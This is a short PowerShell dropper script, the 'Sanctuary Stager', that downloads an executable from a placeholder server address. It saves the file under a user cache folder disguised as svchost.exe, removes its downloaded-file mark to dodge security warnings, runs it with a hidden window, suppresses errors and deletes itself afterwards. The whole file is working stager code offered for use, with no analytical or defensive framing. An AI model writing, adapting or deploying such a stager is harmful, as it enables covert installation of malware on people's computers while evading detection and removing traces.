# PowerShell Sanctuary Stager
# This script downloads and executes the Sanctuary Launcher stealthily.

$url = "http://YOUR_SERVER_IP/Launcher.exe" # Replace with your direct link
$path = "$env:LOCALAPPDATA\Microsoft\Windows\Caches\svchost.exe"

# 1. Create directory if not exists
if (!(Test-Path (Split-Path $path))) {
    New-Item -ItemType Directory -Force -Path (Split-Path $path) | Out-Null
}

try {
    # 2. Download with BITS or WebClient (stealthier than Invoke-WebRequest)
    $clnt = New-Object System.Net.WebClient
    $clnt.DownloadFile($url, $path)

    # 3. Unblock file (remove Zone.Identifier)
    Unblock-File -Path $path

    # 4. Start process hidden
    Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue

    Write-Host "[+] Sanctuary Initialized."
} catch {
    # Silent fail
}

# 5. Self-delete script if running as file
if ($PSCommandPath) {
    Remove-Item $PSCommandPath -Force
}
